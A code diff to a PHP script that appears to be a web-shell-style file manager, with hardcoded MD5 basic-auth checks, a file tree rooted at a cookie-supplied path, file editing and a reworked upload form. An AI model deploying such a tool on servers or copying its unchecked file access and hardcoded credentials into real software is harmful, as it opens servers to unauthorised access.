@@ -198,7 +198,7 @@ if (md5($_SERVER['PHP_AUTH_USER']) == 'ee11cbb19052e40b07aac0ca060c23ee' && md5(
       echo '<button onclick="window.history.back();">Back</button>';
     }
   }
-  else if (array_key_exists('upload', $_GET)) {
+  else if (array_key_exists('uploadfile', $_GET)) {
     echo '<form action="" method="POST" enctype="multipart/form-data"><input type="file" name="image">'."\n".'<button onclick="window.history.back();">Cancel</button>'."\n".'<input type="submit" name="submit"></form>';
   }
   else if (array_key_exists('edit', $_GET)) {
@@ -227,6 +227,9 @@ function newFile(path) {
 }
 function newFolder(path) {
   location.href = '?newfolder=' + path;
+}
+function uploadFile() {
+  location.href = '?uploadfile';
 }
 
 
@@ -264,20 +267,12 @@ var d = this.innerHTML;
                         if ("UL" == e.tagName) {
                             var n = "none" == e.style.display;
 
-
-
-
-
-if (n) {document.cookie = MD5(d) + "=" + n;}
-else {
-  document.cookie = MD5(d) + "=; expires=Thu, 01 Jan 1970 00:00:01 GMT;"
-}
-
-
+                              if (n) {document.cookie = MD5(d) + "=" + n;}
+                              else {
+                                document.cookie = MD5(d) + "=; expires=Thu, 01 Jan 1970 00:00:01 GMT;"
+                              }
 
                             return e.style.display = n ? "block" : "none", this.className = n ? "open" : "closed", !1
-
-
                         }
                         e = e.nextSibling
                     }
@@ -296,7 +291,7 @@ window.onload = initPHPFileTree;
 
 <?php
 
-    echo '<button>Delete</button>'."\n".'<button>Archive gzip</button>'."\n".'<button>Unarchive gzip</button>'."\n".'<a href="?upload">Upload files</a>';
+    echo '<button>Delete</button>'."\n".'<button onclick="uploadFile()">Upload file</button>';
     echo '<hr>';
     echo $tree->php_file_tree($_COOKIE['phpshbin_path'], "?edit=[link]");
   }
